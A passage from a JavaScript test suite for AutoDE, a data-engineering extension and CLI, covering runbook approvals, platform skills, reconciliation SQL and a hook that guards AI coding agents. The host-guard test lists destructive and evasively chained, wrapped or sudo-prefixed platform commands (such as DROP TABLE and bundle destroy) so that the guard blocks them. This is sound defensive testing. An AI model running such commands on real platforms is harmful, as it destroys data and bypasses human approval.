      assert.deepStrictEqual([st.status, st.runnable, /2 approval/.test(st.whyNot)], ['awaiting-second-approval', false, true], JSON.stringify(st));
      assert.strictEqual((await cli(['runbook', 'approve', 'deploy-prod', ...W, '--by', 'priya'], { interactive: true, answers: ['approve'] })).code, 4, 'the same person twice');
      assert.strictEqual((await cli(['runbook', 'approve', 'deploy-prod', ...W, '--by', 'arun'], { interactive: true, answers: ['approve'] })).code, 0);
      st = (await call('autode_runbook_status', { id: 'deploy-prod' })).runbooks[0];
      assert.deepStrictEqual([st.status, st.runnable, st.approvals.map((a) => a.by)], ['approved', true, ['priya', 'arun']]);
      assert.ok(/deploy-prod\s+prod\s+approved/.test((await cli(['runbook', 'list', ...W])).out));
      void p2;
      // The tab and its page.
      const pkg = require('../package.json');
      assert.ok(pkg.contributes.commands.some((c) => c.command === 'autoDataEngineeringHub.openRunbook'));
      const page = nodeFs.readFileSync(require('node:path').join(__dirname, '..', 'media', 'runbook.html'), 'utf8');
      assert.ok(/script-src 'nonce-\{\{nonce\}\}'/.test(page) && page.includes('not checked by AutoDE') && page.includes('Run step…'));
      assert.ok(nodeFs.readFileSync(require('node:path').join(__dirname, '..', '.vscodeignore'), 'utf8').includes('!media/runbook.html'));
    } finally { if (client) await client.close(); nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  await test('v0.45.6: install guidance for the platform CLIs is data — vendor page, options per OS probed on this machine, last-verified date; a team overrides it; the Oracle driver\'s range stays in code', () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const Q = fresh('../dist/engine/platform/prerequisites.js');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-pre-'));
    try {
      let { guides, errors } = Q.loadToolGuides(wfRes(), ws);
      assert.deepStrictEqual(errors, []);
      const sf = guides.find((g) => g.id === 'snowflake-cli');
      const db = guides.find((g) => g.id === 'databricks-cli');
      assert.ok(sf.verifiedAt && /snowflake\.com/.test(sf.docs) && db.minVersion === '0.205.0');
      const has = new Set(['winget', 'uv']);
      const run = (argv) => ({ status: has.has(argv[0]) ? 0 : null, error: has.has(argv[0]) ? undefined : new Error('ENOENT') });
      const win = Q.probeOptions(sf, 'win32', run);
      assert.deepStrictEqual(win.map((o) => [o.manager, o.available]), [['pipx', false], ['uv', true]], 'no Homebrew option on Windows; pipx missing here');
      assert.deepStrictEqual(Q.probeOptions(db, 'win32', run).map((o) => [o.manager, o.available, o.commands[0].join(' ')]), [['WinGet', true, 'winget install Databricks.DatabricksCLI']]);
      // A team points at its own software centre.
      nodeFs.mkdirSync(nodePath.join(ws, '.autode', 'config'), { recursive: true });
      nodeFs.writeFileSync(nodePath.join(ws, '.autode', 'config', 'prerequisites.yaml'), 'tools:\n  databricks-cli:\n    platform: databricks\n    title: Databricks CLI\n    docs: https://intranet.example.com/databricks\n    options:\n      - manager: Company Portal\n        os: [win32]\n        probe: [winget, --version]\n        commands:\n          - [winget, install, --source, corp, Databricks.DatabricksCLI]\n');
      ({ guides, errors } = Q.loadToolGuides(wfRes(), ws));
      const team = guides.find((g) => g.id === 'databricks-cli');
      assert.deepStrictEqual([team.docs, team.options[0].manager], ['https://intranet.example.com/databricks', 'Company Portal']);
      const src = nodeFs.readFileSync(nodePath.join(__dirname, '..', 'src', 'engine', 'platform', 'driverStore.ts'), 'utf8');
      assert.ok(/range: '\^6\.0\.0'/.test(src), 'the driver range is a reviewed contract in code');
      for (const f of ['prerequisites.yaml']) assert.ok(nodeFs.readFileSync(nodePath.join(__dirname, '..', '.vscodeignore'), 'utf8').includes(`!${f}`) && require('../scripts/pack-cli.cjs').CONTENT.includes(f), f);
    } finally { nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  // ---------- v0.45.7: SIMP-1 — one approvals list, the concept map ----------

  await test('v0.45.7: Waiting for you gathers everything that waits for a person — decisions of every kind, facts to review, stage documents, runbooks needing a second approver — high stakes first, each with where and how it is approved', async () => {
    const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const ws = runbookWs(POLICY);
    let client;
    try {
      const { id, prob, W } = await tinyFlow(ws, cli);
      const Wt = fresh('../dist/engine/approvals/waiting.js');
      const { DecisionStore } = fresh('../dist/engine/decisions/decisionStore.js');
      const Pr = fresh('../dist/engine/decisions/proposals.js');
      let items = Wt.waitingForYou({ workspaceRoot: ws, resourcesRoot: wfRes(), problemId: id });
      const wf = items.find((i) => i.opens.view === 'workflow');
      assert.ok(wf && wf.cli === 'autode workflow approve' && wf.stakes === 'high', JSON.stringify(items));
      assert.strictEqual((await cli(['workflow', 'approve', ...W, '--by', 'priya'], { interactive: true, answers: ['approve'] })).code, 0);
      // A drafted mapping document, a runbook decision, a prod runbook after its first approval, a low-stakes vocabulary decision, facts.
      const D = fresh('../dist/engine/documents/problemDocuments.js');
      D.writeMappingUpsert(prob, { id: 'm1', sourceEntityId: 'shop.orders', sourceFqn: 'shop.orders', targetName: 'fct', columns: [{ sourceColumn: 'a', targetColumn: 'a' }] });
      const store = new DecisionStore(ws);
      const ctx = { workspaceRoot: ws, problemRoot: prob, problemId: id };
      Pr.propose(store, ctx, 'runbook', deployRunbook({ steps: deployRunbook().steps.slice(0, 1) }), { proposedBy: { host: 'mcp', client: 'Claude Code' } });
      const prodD = Pr.propose(store, ctx, 'runbook', deployRunbook({ id: 'deploy-prod', connectionId: 'snowflake:prod', steps: deployRunbook().steps.slice(0, 1) }), { proposedBy: { host: 'mcp', client: 'Claude Code' } });
      store.resolve(prodD.id, { decision: 'approved', by: 'priya', channel: 'cli' });
      await Pr.applyDecision(store, prodD.id, ctx);
      Pr.propose(store, ctx, 'vocabulary', { entries: [{ kind: 'abbreviation', from: 'cust', to: 'customer' }] }, { proposedBy: { host: 'mcp', client: 'Claude Code' } });
      const facts = [{ id: 'f1', kind: 'key', stakes: 'high' }, { id: 'f2', kind: 'business_term', stakes: 'low' }];
      items = Wt.waitingForYou({ workspaceRoot: ws, resourcesRoot: wfRes(), problemId: id, facts });
      const by = (k) => items.filter((i) => i.kind === k);
      assert.deepStrictEqual(by('stage-document').map((i) => [i.opens.ref, i.cli]), [['mapping', 'autode workflow approve mapping']]);
      assert.ok(by('runbook').some((i) => i.cli === 'autode runbook approve deploy-prod' && /second approver/.test(i.detail)));
      assert.ok(by('decision').some((i) => i.opens.view === 'runbook' && i.opens.ref === 'deploy-orders'));
      assert.ok(by('facts')[0].title === '2 fact(s) to review' && by('facts')[0].stakes === 'high');
      const firstLow = items.findIndex((i) => i.stakes === 'low');
      assert.ok(firstLow > 0 && items.slice(firstLow).every((i) => i.stakes === 'low'), 'high stakes first');
      // The CLI and MCP show the same list.
      const c = await cli(['approvals', ...W, '--json']);
      assert.strictEqual(c.code, 0, c.err);
      assert.ok(c.json().items.some((i) => i.kind === 'runbook') && c.json().items.some((i) => i.kind === 'stage-document'));
      assert.ok(/approve: autode runbook approve deploy-prod/.test((await cli(['approvals', ...W])).out));
      client = await mcpSession(ws);
      const m = (await client.callTool({ name: 'autode_approvals_list', arguments: {} })).structuredContent;
      assert.deepStrictEqual(m.items.map((i) => i.key).filter((k) => !k.startsWith('facts')).sort(), c.json().items.map((i) => i.key).filter((k) => !k.startsWith('facts')).sort());
      void nodeFs;
    } finally { if (client) await client.close(); require('node:fs').rmSync(ws, { recursive: true, force: true }); }
  });

  await test('v0.45.7: a stage no AutoDE skill does is manual — no agent with the wrong method; it says so on every surface; the concept map in the onboarding guide lists the concepts and what is internal', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-manual-'));
    try {
      const { id, W } = await tinyFlow(ws, cli);
      assert.strictEqual((await cli(['workflow', 'plan', '--template', 'tiny', ...W])).code, 0);
      const A = fresh('../dist/engine/agents/assignment.js');
      const scope = { workspaceRoot: ws, resourcesRoot: wfRes(), problemId: id };
      const wf = fresh('../dist/engine/workflows/instance.js').readWorkflow(nodePath.join(ws, '.autode', 'problems', id));
      wf.stages.find((s) => s.id === 'bi').included = true;
      fresh('../dist/engine/workflows/instance.js').writeWorkflow(nodePath.join(ws, '.autode', 'problems', id), wf);
      const r = A.assignmentFor(scope, 'bi', []);
      assert.ok(!r.assignment && /No AutoDE skill does bi-migration stages yet/.test(r.reason), JSON.stringify(r));
      assert.ok(A.assignmentFor(scope, 'quality', []).assignment, 'a stage with a skill still gets its agent');
      const page = nodeFs.readFileSync(nodePath.join(__dirname, '..', 'docs', 'engineering-onboarding-guide.md'), 'utf8');
      for (const c of ['**Business problem**', '**Specification**', '**Pack**', '**Estate and facts**', '**Workflow**', '**Approvals**', '**Mapping**', '**Model**', '**Pipeline Spec**', '**Artifacts**', '**Runbook**', '**Agents and skills**', '#### Internal', '#### Being simplified', '### 4.12 Runbooks and the runner']) assert.ok(page.includes(c), c);
      const html = nodeFs.readFileSync(nodePath.join(__dirname, '..', 'media', 'workflow.html'), 'utf8');
      assert.ok(html.includes('manual</span>'));
      assert.ok(require('../package.json').contributes.commands.some((x) => x.command === 'autoDataEngineeringHub.openWaiting'));
    } finally { nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  // ── v0.45.11: platform skills, the reconciliation plan, the host guard ──

  await test('v0.45.11: every platform skill\'s worked example is grounded in the reference estate, in its platform\'s dialect, and its runbooks pass the engine\'s checks; a broken example is caught item by item', () => {
    const P = fresh('./platformSkillCheck.cjs');
    const results = P.checkPlatformSkills();
    assert.deepStrictEqual(results.map((r) => r.id).sort(), ['autode-databricks-deployment', 'autode-databricks-governance', 'autode-databricks-ingestion', 'autode-databricks-performance', 'autode-databricks-pipelines', 'autode-dbt-project', 'autode-de-reconciliation',
      'autode-snowflake-deployment', 'autode-snowflake-governance', 'autode-snowflake-ingestion', 'autode-snowflake-performance', 'autode-snowflake-pipelines']);
    for (const r of results) assert.deepStrictEqual(r.errors, [], r.id);
    assert.ok(results.find((r) => r.id === 'autode-snowflake-pipelines').grounding.columnsResolved >= 20, 'the examples read real estate columns');
    // The check catches what it is for.
    const { skills, ctx } = P.platformSkills();
    const md = (id) => require('node:fs').readFileSync(require('node:path').join(skills.find((k) => k.id === id).dir, 'SKILL.md'), 'utf8').replace(/\r\n/g, '\n');
    const errs = (id, text) => P.checkSkill(skills.find((k) => k.id === id), ctx, text).errors.join('\n');
    assert.match(errs('autode-snowflake-ingestion', md('autode-snowflake-ingestion').replace('  channel VARCHAR(20),\n', '  sales_channel VARCHAR(20),\n')), /landing column sales_channel is not in shop\.orders[\s\S]*misses shop\.orders\.channel/);
    assert.match(errs('autode-snowflake-pipelines', md('autode-snowflake-pipelines').replace('FROM shop.orders o\nQUALIFY', 'FROM shop.order_lines o\nQUALIFY')), /table shop\.order_lines doesn't resolve/);
    assert.match(errs('autode-snowflake-performance', md('autode-snowflake-performance').replace('ALTER TABLE marts.fct_orders CLUSTER BY (order_date);', 'OPTIMIZE marts.fct_orders;')), /not snowflake SQL \(OPTIMIZE/);
    assert.match(errs('autode-databricks-performance', md('autode-databricks-performance').replace(/    noRollbackReason: .*\r?\n/, '')), /step vacuum is destructive/);
    assert.match(errs('autode-snowflake-deployment', md('autode-snowflake-deployment').replace('argv: [snow, dbt, execute, retail_orders, run]', 'argv: [snow, dbt, execute, retail_orders, run, --connection, prod]')), /--connection is not allowed/);
    assert.match(errs('autode-databricks-deployment', md('autode-databricks-deployment').replace(/  warehouse_id:\r?\n    description: .*\r?\n/, '')), /\$\{var\.warehouse_id\} is not declared/);
    assert.match(errs('autode-dbt-project', md('autode-dbt-project').replace('          - name: status\n', '          - name: order_state\n')), /dbt source column shop\.orders\.order_state/);
    // The reconciliation example is exactly what autode_reconcile_plan generates.
    const R = fresh('../dist/engine/agents/reconcilePlan.js');
    const cols = [...ctx.estate.columns('shop.orders').entries()].map(([name, type]) => ({ name, type }));
    const plan = R.reconcilePlan({ source: { table: 'shop.orders', platform: 'postgres', columns: cols }, target: { table: 'raw.shop_orders_raw', platform: 'snowflake', columns: cols },
      keys: [{ source: 'order_id', target: 'order_id' }], columns: ['order_id', 'status', 'shipping_amount', 'updated_at'].map((c) => ({ source: c, target: c })) }).plan;
    const example = P.skillBlocks(md('autode-de-reconciliation')).find((b) => b.lang === 'sql').body.trim().replace(/\r\n/g, '\n');
    assert.strictEqual(example, plan.queries[0].sql);
  });

  await test('v0.45.11: the reconciliation plan — aggregates by type per side, a key hash only on one platform, missing keys only on one connection, tolerances only for sums; unknown columns and a missing key are refused', () => {
    const R = fresh('../dist/engine/agents/reconcilePlan.js');
    const cols = [{ name: 'order_id', type: 'BIGINT' }, { name: 'amount', type: 'DECIMAL(10,2)' }, { name: 'placed_at', type: 'TIMESTAMP' }, { name: 'status', type: 'VARCHAR(20)' }];
    const side = (table, platform) => ({ table, platform, columns: cols });
    const pairs = cols.map((c) => ({ source: c.name, target: c.name }));
    let r = R.reconcilePlan({ source: side('shop.orders', 'snowflake'), target: side('marts.orders', 'snowflake'), keys: [{ source: 'order_id', target: 'order_id' }], columns: pairs, sameConnection: true });
    const [src] = r.plan.queries;
    for (const x of ['COUNT(*) AS row_count', 'HASH_AGG(order_id) AS key_hash', 'SUM(amount) AS sum_amount', 'MIN(placed_at) AS min_placed_at', 'COUNT(DISTINCT status) AS distinct_status', 'COUNT(*) - COUNT(status) AS nulls_status']) assert.ok(src.sql.includes(x), x);
    assert.ok(!/sum_status|sum_placed_at|distinct_amount/.test(src.sql), 'by type');
    assert.deepStrictEqual(r.plan.queries.map((q) => q.id), ['source-profile', 'target-profile', 'missing-in-target', 'missing-in-source']);
    assert.ok(/LEFT JOIN[\s\S]*ON s\.order_id = t\.order_id[\s\S]*WHERE t\.order_id IS NULL/.test(r.plan.queries[2].sql));
    assert.deepStrictEqual(r.plan.comparisons.filter((c) => c.rule === 'within-tolerance').map((c) => c.metric), ['sum_amount']);
    for (const q of r.plan.queries) assert.strictEqual(fresh('../dist/engine/platform/sqlGuard.js').checkReadOnlySql(q.sql).ok, true, q.id);
    r = R.reconcilePlan({ source: side('shop.orders', 'oracle'), target: side('main.orders', 'databricks'), keys: [{ source: 'order_id', target: 'order_id' }, { source: 'status', target: 'status' }], columns: pairs });
    assert.ok(!r.plan.queries[0].sql.includes('key_hash') && !r.plan.queries[1].sql.includes('key_hash') && r.plan.queries.length === 2);
    assert.ok(/COALESCE\(CAST\(order_id AS VARCHAR\(4000\)\), '~'\) \|\| '\|' \|\|/.test(r.plan.queries[0].sql) && r.plan.queries[1].sql.includes('COUNT(DISTINCT order_id, status)'), 'distinct composite keys per dialect');
    assert.ok(r.plan.notes.some((n) => /different platforms/.test(n)) && r.plan.notes.some((n) => /different connections/.test(n)));
    r = R.reconcilePlan({ source: side('a.t', 'databricks'), target: side('b.t', 'databricks'), keys: [{ source: 'order_id', target: 'order_id' }], columns: pairs });
    assert.ok(r.plan.queries[0].sql.includes('SUM(CAST(xxhash64(order_id) AS DECIMAL(38, 0))) AS key_hash'));
    assert.deepStrictEqual(R.reconcilePlan({ source: side('a.t'), target: side('b.t'), keys: [], columns: [{ source: 'ghost', target: 'amount' }] }).errors, ['Reconciliation needs the key (columns on both sides): without one, only row counts can be compared. Confirm the key fact first.', 'Column ghost is not in a.t.']);
  });

  await test('v0.45.11: a stage gets the platform\'s skills — platform setup goes to the target architect, deploy and build to the pipeline engineer, reconcile to the source assessor; dbt skills only when dbt is the transformation tool', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-pskills-'));
    try {
      const dir = nodePath.join(ws, '.autode', 'config', 'workflows');
      nodeFs.mkdirSync(dir, { recursive: true });
      const st = (id, kind) => `  - id: ${id}\n    title: ${id}\n    kind: ${kind}\n    inclusion: default\n    consumes: [spec]\n    after: [plan (approved)]\n`;
      nodeFs.writeFileSync(nodePath.join(dir, 'plat.yaml'), 'id: plat\nversion: 1\ntitle: Platform\ndescription: Platform stages.\nstages:\n  - id: specify\n    title: Specification\n    kind: specify\n    inclusion: mandatory\n  - id: plan\n    title: Plan\n    kind: plan\n    inclusion: mandatory\n    after: [specify (approved)]\n'
        + st('setup', 'platform-setup') + st('build', 'build') + st('deploy', 'deploy') + st('reconcile', 'reconcile') + st('target', 'target-context'));
      const W = ['--workspace', ws];
      const id = (await cli(['problems', 'new', 'Daily revenue from the shop orders', ...W, '--json'])).json().id;
      const prob = nodePath.join(ws, '.autode', 'problems', id);
      const spec = nodePath.join(prob, 'spec', 'business-problem.yaml');
      nodeFs.writeFileSync(spec, nodeFs.readFileSync(spec, 'utf8').replace('status: draft', 'status: approved').replace('problemStatementApproved: false', 'problemStatementApproved: true'));
      assert.strictEqual((await cli(['workflow', 'plan', '--template', 'plat', ...W])).code, 0);
      const A = fresh('../dist/engine/agents/assignment.js');
      const scope = { workspaceRoot: ws, resourcesRoot: wfRes(), problemId: id, home: ws };
      const ctxFile = nodePath.join(prob, 'context', 'target-context.yaml');
      nodeFs.mkdirSync(nodePath.dirname(ctxFile), { recursive: true });
      const target = (extra) => nodeFs.writeFileSync(ctxFile, `specId: x\nspecVersion: 1\nstatus: built\nplatform: snowflake\n${extra}`);
      const got = (stage) => { const a = A.assignmentFor(scope, stage, []).assignment; return a && [a.role, a.skills.map((k) => k.id).sort()]; };
      target('transformationTool: custom-sql\n');
      assert.deepStrictEqual(got('setup'), ['target-architect', ['autode-snowflake-governance', 'autode-snowflake-ingestion', 'autode-snowflake-performance']]);
      assert.deepStrictEqual(got('deploy'), ['pipeline-engineer', ['autode-snowflake-deployment']]);
      assert.deepStrictEqual(got('reconcile'), ['source-assessor', ['autode-de-reconciliation']]);
      assert.ok(!got('build')[1].includes('autode-dbt-project'), 'no dbt skill without dbt');
      assert.match(A.assignmentFor(scope, 'target', []).reason, /No AutoDE skill does target-context stages yet/, 'the target architect exists, but the target context stays a form');
      target('transformationTool: dbt\n');
      assert.ok(got('build')[1].includes('autode-dbt-project') && got('build')[1].includes('autode-snowflake-pipelines'));
      assert.ok(A.skillFits({ meta: { scope: 'dbt', stageKinds: ['build'], platforms: ['snowflake', 'databricks'] } }, 'build', { platform: 'databricks', transformationTool: 'dbt' }));
      assert.ok(!A.skillFits({ meta: { scope: 'dbt', stageKinds: ['build'], platforms: ['snowflake', 'databricks'] } }, 'build', { platform: 'oracle', transformationTool: 'dbt' }));
      nodeFs.writeFileSync(ctxFile, 'specId: x\nspecVersion: 1\nstatus: built\nplatform: databricks\n');
      assert.deepStrictEqual(got('setup'), ['target-architect', ['autode-databricks-governance', 'autode-databricks-ingestion', 'autode-databricks-performance']]);
      // v0.46.0: an imported skill that declares a stage kind joins its assignments once published and reviewed.
      const lc = require('../dist/engine/skills/lifecycle.js');
      const team = nodePath.join(ws, '.autode', 'config', 'skills', 'tool-skills', 'finance-recon-rules');
      nodeFs.mkdirSync(team, { recursive: true });
      nodeFs.writeFileSync(nodePath.join(team, 'SKILL.md'), '---\nname: finance-recon-rules\ndescription: How finance reconciles revenue.\nmetadata:\n  stageKinds: [reconcile, not-a-kind]\n---\nRevenue matches to the cent.\n');
      lc.recordImport(team, { source: 'local', location: team }, 'arun');
      assert.deepStrictEqual(got('reconcile'), ['source-assessor', ['autode-de-reconciliation']], 'unreviewed: not in assignments');
      lc.setTrustTier(team, 'reviewed', 'arun');
      assert.deepStrictEqual(got('reconcile'), ['source-assessor', ['autode-de-reconciliation', 'finance-recon-rules']]);
      assert.match(A.assignmentFor(scope, 'reconcile', []).assignment.text, /## Skill: finance-recon-rules\nHow finance reconciles revenue\.\n\nRevenue matches to the cent\./);
      assert.ok(!got('deploy')[1].includes('finance-recon-rules'));
      const deploy = A.assignmentFor(scope, 'deploy', [{ name: 'autode_propose_runbook', annotations: {} }, { name: 'autode_runbook_status', annotations: { readOnlyHint: true } }, { name: 'autode_execute_query', annotations: { readOnlyHint: true, openWorldHint: true } }]).assignment;
      assert.deepStrictEqual([deploy.skills.map((k) => k.id), deploy.engineTools], [['autode-databricks-deployment'], ['autode_propose_runbook', 'autode_runbook_status']], 'deploy proposes runbooks; it never queries the platform');
      assert.ok(deploy.text.includes('databricks bundle validate') && /databricks-dabs/.test(deploy.text), 'the method, and the vendor skill as a pointer');
    } finally { nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  await test('v0.45.11: the host guard blocks platform-changing snow and databricks commands — however they are chained, wrapped or quoted — and lets reads and local setup through; autode hook guard answers the host with exit 2', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const G = fresh('../dist/engine/runner/hostGuard.js');
    const dirTmp = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-guard-'));
    try {
      nodeFs.writeFileSync(nodePath.join(dirTmp, 'read.sql'), 'SELECT 1;\n-- a comment\nSHOW TABLES;\n');
      nodeFs.writeFileSync(nodePath.join(dirTmp, 'write.sql'), 'SELECT 1;\nDROP TABLE marts.fct_orders;\n');
      const blocked = (cmd) => G.guardShellCommand(cmd, dirTmp).block;
      for (const c of ['databricks bundle deploy --target prod', 'cd bundles/x && databricks bundle deploy', 'snow sql -q "CREATE TABLE t (a INT)"', 'snow sql -f write.sql', 'snow sql', 'snow stage copy ./a @s',
        'databricks jobs run-now 123', 'databricks fs cp a dbfs:/b', 'databricks api post /api/2.1/jobs/run-now --json "{}"', 'FOO=1 sudo /usr/local/bin/databricks bundle destroy', 'bash -c "databricks bundle deploy"',
        'echo hi; snow object create table x', 'C:\\Tools\\databricks.exe pipelines start-update p1', 'npx snow dbt deploy p --source d', 'databricks --profile prod bundle deploy', 'git status | databricks workspace import x y'])
        assert.strictEqual(blocked(c), true, c);
      for (const c of ['databricks bundle validate', 'databricks catalogs list', 'databricks --profile prod schemas get main.raw', 'snow sql -q "SELECT COUNT(*) FROM t"', 'snow sql -f read.sql', 'snow object list table',
        'snow connection test', 'snow --version', 'databricks auth login --host https://x', 'databricks bundle init', 'databricks jobs run-now --help', 'databricks api get /api/2.1/jobs/list', 'git commit -m "databricks bundle deploy"', 'echo snow', 'npm test'])
        assert.strictEqual(blocked(c), false, c);
      const v = G.guardShellCommand('databricks bundle validate && databricks bundle deploy -t dev', dirTmp);
      assert.deepStrictEqual(v.commands.map((x) => x.class), ['read', 'change']);
      assert.match(v.reason, /databricks bundle deploy[\s\S]*autode_propose_runbook/);
      assert.strictEqual(G.guardHookEvent({ tool_name: 'Read', tool_input: { command: 'databricks bundle deploy' } }, dirTmp).block, false, 'shell tools only');
      assert.strictEqual(G.guardHookEvent({ tool_name: 'PowerShell', tool_input: { command: '& databricks bundle deploy' }, cwd: dirTmp }, '.').block, true);
      // The CLI: the host's JSON on stdin, exit 2 and the reason on stderr when blocked.
      const { run } = fresh('../dist/cli/main.js');
      const hook = async (event) => { const err = []; const code = await run(['hook', 'guard'], { out: () => {}, err: (t) => err.push(t), env: {}, cwd: dirTmp, interactive: false, prompt: async () => '', readStdin: async () => event }); return { code, err: err.join('\n') }; };
      let r = await hook(JSON.stringify({ hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command: 'snow sql -f write.sql' }, cwd: dirTmp }));
      assert.deepStrictEqual([r.code, /changes the platform/.test(r.err)], [2, true], r.err);
      r = await hook(JSON.stringify({ tool_name: 'Bash', tool_input: { command: 'snow sql -f read.sql' }, cwd: dirTmp }));
      assert.deepStrictEqual([r.code, r.err], [0, '']);
      assert.strictEqual((await hook('not json')).code, 0, 'input it can\'t read passes');
    } finally { nodeFs.rmSync(dirTmp, { recursive: true, force: true }); }
  });

  await test('v0.45.11: the plugin carries the guard hook (hooks/hooks.json); installing for Claude Code merges it into the settings once, keeping the team\'s own hooks; unreadable settings are left alone; other hosts are told it is a convention', () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const Pl = fresh('../dist/engine/agents/plugin.js');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-hookws-'));
    const home = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-hookhome-'));
    try {
      const entry = { command: 'node', args: ['/x/dist/autode.js', 'mcp', '--workspace', '.'] };
      assert.deepStrictEqual(Pl.guardEntry(entry), { command: 'node', args: ['/x/dist/autode.js', 'hook', 'guard'] });
      assert.deepStrictEqual(Pl.guardEntry({ command: 'cmd', args: ['/c', 'autode', 'mcp', '--workspace', '.'] }).args, ['/c', 'autode', 'hook', 'guard']);
      const out = nodePath.join(ws, 'plugin');
      Pl.buildPlugin({ resourcesRoot: wfRes(), outDir: out, version: '0.0.0', entry });
      const hooks = JSON.parse(nodeFs.readFileSync(nodePath.join(out, 'hooks', 'hooks.json'), 'utf8'));
      assert.deepStrictEqual(hooks, { hooks: { PreToolUse: [{ matcher: 'Bash|PowerShell', hooks: [{ type: 'command', command: 'node /x/dist/autode.js hook guard', timeout: 15 }] }] } });
      assert.ok(nodeFs.existsSync(nodePath.join(out, 'agents', 'target-architect.md')) && nodeFs.existsSync(nodePath.join(out, 'skills', 'autode-databricks-deployment', 'SKILL.md')));
      const settings = nodePath.join(ws, '.claude', 'settings.json');
      nodeFs.mkdirSync(nodePath.dirname(settings), { recursive: true });
      const theirs = { matcher: 'Write', hooks: [{ type: 'command', command: 'prettier --check' }] };
      nodeFs.writeFileSync(settings, JSON.stringify({ permissions: { allow: ['Bash(npm test)'] }, hooks: { PreToolUse: [theirs] } }));
      const install = () => Pl.installPlugin({ host: 'claude', scope: 'project', resourcesRoot: wfRes(), workspaceRoot: ws, home, entry });
      let r = install();
      let s = JSON.parse(nodeFs.readFileSync(settings, 'utf8'));
      assert.deepStrictEqual([s.permissions.allow, s.hooks.PreToolUse.length, s.hooks.PreToolUse[0]], [['Bash(npm test)'], 2, theirs]);
      assert.ok(r.written.includes(settings) && r.notes.some((n) => /guard hook/.test(n)));
      r = install();
      s = JSON.parse(nodeFs.readFileSync(settings, 'utf8'));
      assert.deepStrictEqual([s.hooks.PreToolUse.length, r.written.includes(settings)], [2, false], 'once, and unchanged on reinstall');
      nodeFs.writeFileSync(settings, '{ "hooks": // a comment\n }');
      r = install();
      assert.ok(r.errors.some((e) => /settings\.json[\s\S]*guard hook was not added/.test(e)) && nodeFs.readFileSync(settings, 'utf8').includes('// a comment'), 'left alone');
      for (const host of ['cortex', 'copilot']) assert.ok(Pl.installPlugin({ host, scope: 'project', resourcesRoot: wfRes(), workspaceRoot: ws, home, entry }).notes.some((n) => /convention/.test(n)), host);
    } finally { for (const d of [ws, home]) nodeFs.rmSync(d, { recursive: true, force: true }); }
  });

  await test('v0.45.11: runbook checks know the platforms — the other platform\'s SQL is flagged, VACUUM is destructive, dbt, pipeline and bundle-summary commands are allowlisted; grounding reads Lakeflow streams, table functions, platform catalogs and revokes correctly', () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const RB = fresh('../dist/engine/runner/runbook.js');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-rbplat-'));
    try {
      const { CONNECTIONS } = fresh('./platformSkillCheck.cjs');
      const policy = fresh('../dist/engine/runner/policy.js').loadRunbookPolicy(ws);
      const step = (id, sql) => ({ id, title: id, kind: 'sql', sql, expect: 'x' });
      let c = RB.checkRunbook({ id: 'mixed', title: 't', reason: 'r', connectionId: 'snowflake:analytics_dev', steps: [step('opt', 'OPTIMIZE marts.fct_orders'), step('ok', 'CREATE TABLE IF NOT EXISTS marts.x (a INT)')] }, { workspaceRoot: ws, connections: CONNECTIONS, policy });
      assert.ok(c.ok && c.warnings.some((w) => /step opt looks like Databricks SQL \(OPTIMIZE/.test(w)) && !c.warnings.some((w) => /step ok looks like/.test(w)), c.warnings.join());
      c = RB.checkRunbook({ id: 'mixed2', title: 't', reason: 'r', connectionId: 'databricks:lakehouse_dev', steps: [step('dt', "CREATE DYNAMIC TABLE IF NOT EXISTS s.t TARGET_LAG = '1 hour' WAREHOUSE = w AS SELECT 1 AS a")] }, { workspaceRoot: ws, connections: CONNECTIONS, policy });
      assert.ok(c.warnings.some((w) => /looks like Snowflake SQL/.test(w)));
      assert.deepStrictEqual(RB.classifySql('VACUUM t RETAIN 168 HOURS').class, 'destructive');
      for (const [argv, cls, conn] of [[['snow', 'dbt', 'deploy', 'p'], 'change', 'snowflake:analytics_dev'], [['snow', 'dbt', 'list'], 'read', 'snowflake:analytics_dev'], [['databricks', 'pipelines', 'start-update', 'p1'], 'change', 'databricks:lakehouse_dev'], [['databricks', 'bundle', 'summary'], 'read', 'databricks:lakehouse_dev']]) {
        c = RB.checkRunbook({ id: 'cli', title: 't', reason: 'r', connectionId: conn, steps: [{ id: 's', title: 's', kind: 'cli', argv, expect: 'x' }] }, { workspaceRoot: ws, connections: CONNECTIONS, policy });
        assert.deepStrictEqual([c.ok, c.steps[0]?.class], [true, cls], argv.join(' ') + c.errors.join());
      }
      const { buildSchemaIndex, checkSqlGrounding } = fresh('../dist/engine/grounding/sqlGrounding.js');
      const { parseDdl } = fresh('../dist/engine/context/fileIngestion.js');
      const d = parseDdl('CREATE TABLE shop.orders (order_id BIGINT, status VARCHAR(20));', '/s/shop.ddl', { system: 'shop' });
      const idx = buildSchemaIndex(d.nodes, d.edges);
      const g = (sql) => checkSqlGrounding([{ name: 'a.sql', content: sql }], idx);
      let r = g('CREATE OR REFRESH STREAMING TABLE stg AS SELECT o.order_id, o.ghost FROM STREAM(shop.orders) o');
      assert.deepStrictEqual([r.tablesResolved, r.unresolved.map((u) => u.ref)], [1, ['shop.orders.ghost']], 'a stream read resolves its table and alias');
